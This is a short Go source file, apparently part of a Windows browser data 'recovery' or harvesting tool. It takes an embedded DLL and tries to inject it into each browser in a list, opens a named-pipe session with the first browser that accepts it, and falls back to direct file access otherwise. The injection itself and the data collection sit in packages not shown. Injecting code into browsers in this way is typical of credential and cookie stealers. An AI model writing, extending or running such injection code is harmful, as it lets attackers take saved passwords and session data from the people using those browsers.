//go:build windows

package recovery

import (
	"recovery/recovery/browser"
	"recovery/recovery/platform"
)

func platformSetupCollect() {
	dllBytes := platform.GetEmbeddedDLL()
	if dllBytes != nil {
		for _, cfg := range browser.Browsers {
			logf("attempting DLL injection into %s", cfg.Name)
			session, err := platform.CreatePipeSession(dllBytes, cfg.Name)
			if err != nil {
				logf("inject %s failed: %v", cfg.Name, err)
				continue
			}
			_ = session
			logf("pipe session established with %s", cfg.Name)
			break
		}
	} else {
		logf("no embedded DLL — direct file access only")
	}
}

func platformTeardownCollect() {
	if platform.ActivePipeSession != nil {
		platform.ActivePipeSession.Close()
		platform.ActivePipeSession = nil
	}
}
